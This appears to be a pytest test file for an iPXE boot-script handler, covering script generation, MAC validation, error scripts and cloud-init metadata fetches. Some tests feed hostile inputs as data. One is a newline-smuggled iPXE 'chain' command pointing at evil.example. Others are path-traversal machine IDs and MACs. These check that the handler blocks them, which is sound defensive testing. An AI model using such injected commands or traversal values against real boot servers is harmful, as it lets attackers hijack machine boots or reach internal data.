"""Behaviour tests for worker.services.ipxe_handler: script generation, templating and cloud-init fetches."""

import httpx
import pytest
import respx

from worker.config import WorkerConfig
from worker.enrollment import EnrollmentManager
from worker.services.ipxe_handler import IPXEHandler

API = "http://api.test"
MAC_URL = f"{API}/api/v1/internal/boot-script/aabbccddeeff"
BOOT_URL = "http://10.20.30.40:8080"


def _handler(**overrides: object) -> IPXEHandler:
    """Build a handler with a session-enrolled EnrollmentManager and a fixed boot URL."""
    base: dict[str, object] = {
        "api_manager_url": API,
        "worker_api_key": "ipxe-key",
        "worker_id": "w-ipxe",
        "dhcp_mode": "proxy",
        "dhcp_interface": "eth0",
        "http_boot_url": BOOT_URL,
    }
    base.update(overrides)
    cfg = WorkerConfig(**base)  # type: ignore[arg-type]
    enrollment = EnrollmentManager(cfg)
    enrollment.session_token = "sess-ipxe"
    return IPXEHandler(cfg, enrollment)


@pytest.mark.asyncio
async def test_known_machine_returns_api_script_with_auth_headers() -> None:
    """A 200 from api-manager returns its script verbatim and sends both auth headers."""
    handler = _handler()
    with respx.mock(assert_all_called=True) as router:
        route = router.get(MAC_URL).mock(
            return_value=httpx.Response(200, json={"script": "#!ipxe\nboot disk\n", "machine_id": "m1", "status": "ready"})
        )
        script = await handler.generate_script("aa:bb:cc:dd:ee:ff")

    assert script == "#!ipxe\nboot disk\n"
    req = route.calls.last.request
    assert req.headers["X-Worker-API-Key"] == "ipxe-key"
    assert req.headers["X-Worker-Session-Token"] == "sess-ipxe"


@pytest.mark.asyncio
@pytest.mark.parametrize("raw", ["AA-BB-CC-DD-EE-FF", "aa:bb:cc:dd:ee:ff", "AABBCCDDEEFF", "aAbBcCdDeEfF"])
async def test_mac_forms_are_normalised_to_bare_lowercase(raw: str) -> None:
    """Colon, dash and upper-case MAC spellings all resolve to the same bare lowercase API path."""
    handler = _handler()
    with respx.mock(assert_all_called=True) as router:
        route = router.get(MAC_URL).mock(return_value=httpx.Response(200, json={"script": "S"}))
        script = await handler.generate_script(raw)

    assert script == "S"
    assert route.call_count == 1


@pytest.mark.asyncio
async def test_unknown_machine_gets_discovery_script() -> None:
    """A 404 yields the discovery script templated with the MAC and the boot-event callback."""
    handler = _handler()
    with respx.mock:
        respx.get(MAC_URL).mock(return_value=httpx.Response(404))
        script = await handler.generate_script("aa:bb:cc:dd:ee:ff")

    assert script.startswith("#!ipxe\n")
    assert "# Discovery script for new machine: aabbccddeeff" in script
    assert "echo MAC Address: aabbccddeeff" in script
    assert "chain " not in script.split("Boot discovery image")[0]  # no GET chain to the POST-only /boot-event
    assert f"kernel {BOOT_URL}/images/discovery/vmlinuz initrd=initrd ip=dhcp gough.boot_token=${{boot_token}}" in script
    assert f"initrd {BOOT_URL}/images/discovery/initrd" in script
    assert script.rstrip().endswith("shell")


@pytest.mark.asyncio
async def test_server_error_yields_error_script_without_leaking_body() -> None:
    """A 500 from api-manager becomes the generic 'API request failed' error script."""
    handler = _handler()
    with respx.mock:
        respx.get(MAC_URL).mock(return_value=httpx.Response(500, text="stack trace here"))
        script = await handler.generate_script("aa:bb:cc:dd:ee:ff")

    assert "echo API request failed" in script
    assert "stack trace" not in script
    assert script.rstrip().endswith("shell")


@pytest.mark.asyncio
async def test_connect_error_yields_unreachable_script() -> None:
    """A connection failure produces the 'unreachable' error script rather than raising."""
    handler = _handler()
    with respx.mock:
        respx.get(MAC_URL).mock(side_effect=httpx.ConnectError("refused"))
        script = await handler.generate_script("aa:bb:cc:dd:ee:ff")

    assert "echo API manager unreachable" in script


@pytest.mark.asyncio
async def test_unexpected_exception_yields_error_script_with_message() -> None:
    """Other failures are reported in the error script so the operator sees the cause on the console."""
    handler = _handler()
    with respx.mock:
        respx.get(MAC_URL).mock(side_effect=httpx.ReadTimeout("read timed out"))
        script = await handler.generate_script("aa:bb:cc:dd:ee:ff")

    assert "echo read timed out" in script


@pytest.mark.asyncio
async def test_error_message_newlines_cannot_inject_ipxe_commands() -> None:
    """A newline in an exception message must not create a new iPXE line (command injection)."""
    handler = _handler()
    with respx.mock:
        respx.get(MAC_URL).mock(side_effect=httpx.ReadTimeout("oops\nchain http://evil.example/x.ipxe"))
        script = await handler.generate_script("aa:bb:cc:dd:ee:ff")

    lines = script.splitlines()
    assert not any(line.startswith("chain") for line in lines)
    assert any(line.startswith("echo oops chain http://evil.example/x.ipxe") for line in lines)


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "bad_mac",
    ["../../admin", "aa:bb:cc:dd:ee", "aa:bb:cc:dd:ee:ff:00", "zz:bb:cc:dd:ee:ff", "", "aa/bb/cc/dd/ee/ff"],
)
async def test_malformed_mac_is_rejected_before_any_api_call(bad_mac: str) -> None:
    """Non-MAC input never reaches the API URL or the script; the error script is returned instead."""
    handler = _handler()
    with respx.mock(assert_all_called=False) as router:
        route = router.get(url__regex=r".*").mock(return_value=httpx.Response(200, json={"script": "X"}))
        script = await handler.generate_script(bad_mac)

    assert route.call_count == 0
    assert "echo Invalid MAC address" in script
    assert "Discovery" not in script


def test_discovery_script_uses_boot_url_from_config() -> None:
    """Discovery templating pulls the boot base URL from config, not a hardcoded host."""
    handler = _handler(http_boot_url="https://boot.example.net:9443")

    script = handler._generate_discovery_script("001122334455")

    assert "https://boot.example.net:9443/images/discovery/vmlinuz" in script
    assert "http://10.20.30.40" not in script


def test_error_script_flattens_carriage_returns_and_newlines() -> None:
    """Error script joins multi-line messages onto one echo line."""
    handler = _handler()

    script = handler._generate_error_script("line1\r\nline2\rline3")

    assert "echo line1 line2 line3\n" in script
    assert script.rstrip().endswith("shell")


@pytest.mark.asyncio
async def test_cloud_init_metadata_success_returns_body() -> None:
    """A 200 from api-manager returns the metadata body unchanged, with auth headers."""
    handler = _handler()
    url = f"{API}/api/v1/internal/cloud-init/m-42/meta-data"
    with respx.mock(assert_all_called=True) as router:
        route = router.get(url).mock(return_value=httpx.Response(200, text="instance-id: m-42\n"))
        body = await handler.get_cloud_init_metadata("m-42")

    assert body == "instance-id: m-42\n"
    assert route.calls.last.request.headers["X-Worker-API-Key"] == "ipxe-key"


@pytest.mark.asyncio
async def test_cloud_init_metadata_failures_return_fallback() -> None:
    """Non-200 and transport errors both return the static fallback metadata document."""
    handler = _handler()
    url = f"{API}/api/v1/internal/cloud-init/m-42/meta-data"
    fallback = "instance-id: error\nlocal-hostname: unknown\n"
    with respx.mock:
        respx.get(url).mock(return_value=httpx.Response(404))
        assert await handler.get_cloud_init_metadata("m-42") == fallback
    with respx.mock:
        respx.get(url).mock(side_effect=httpx.ConnectError("refused"))
        assert await handler.get_cloud_init_metadata("m-42") == fallback


@pytest.mark.asyncio
async def test_cloud_init_metadata_rejects_traversal_machine_id() -> None:
    """A machine id containing path separators never reaches the API path."""
    handler = _handler()
    with respx.mock(assert_all_called=False) as router:
        route = router.get(url__regex=r".*").mock(return_value=httpx.Response(200, text="pwned"))
        body = await handler.get_cloud_init_metadata("../../internal/secret")

    assert route.call_count == 0
    assert body == "instance-id: error\nlocal-hostname: unknown\n"


@pytest.mark.asyncio
async def test_cloud_init_userdata_success_returns_body() -> None:
    """A 200 from api-manager returns the merged user-data YAML unchanged."""
    handler = _handler()
    url = f"{API}/api/v1/internal/cloud-init/m-9/user-data"
    with respx.mock(assert_all_called=True) as router:
        route = router.get(url).mock(return_value=httpx.Response(200, text="#cloud-config\nhostname: m-9\n"))
        body = await handler.get_cloud_init_userdata("m-9")

    assert body == "#cloud-config\nhostname: m-9\n"
    assert route.calls.last.request.headers["X-Worker-Session-Token"] == "sess-ipxe"


@pytest.mark.asyncio
async def test_cloud_init_userdata_failures_return_fallback() -> None:
    """Non-200 and transport errors both return the static cloud-config fallback."""
    handler = _handler()
    url = f"{API}/api/v1/internal/cloud-init/m-9/user-data"
    fallback = "#cloud-config\n# Error fetching user-data\n"
    with respx.mock:
        respx.get(url).mock(return_value=httpx.Response(500))
        assert await handler.get_cloud_init_userdata("m-9") == fallback
    with respx.mock:
        respx.get(url).mock(side_effect=httpx.ReadTimeout("slow"))
        assert await handler.get_cloud_init_userdata("m-9") == fallback


@pytest.mark.asyncio
async def test_cloud_init_userdata_rejects_invalid_machine_id() -> None:
    """Machine ids with dots or slashes are refused without an API call."""
    handler = _handler()
    with respx.mock(assert_all_called=False) as router:
        route = router.get(url__regex=r".*").mock(return_value=httpx.Response(200, text="x"))
        body = await handler.get_cloud_init_userdata("m.9/../x")

    assert route.call_count == 0
    assert body == "#cloud-config\n# Error fetching user-data\n"


@pytest.mark.asyncio
async def test_token_minting_without_client_address_yields_error_script(token_store: object) -> None:
    """With a token store but no client address, no token is minted and an error script is served."""
    handler = IPXEHandler(_handler().config, _handler().enrollment, token_store)  # type: ignore[arg-type]
    with respx.mock:
        respx.get(MAC_URL).mock(return_value=httpx.Response(404))
        script = await handler.generate_script("aa:bb:cc:dd:ee:ff")

    assert "set boot_token" not in script
    assert "client address unknown" in script
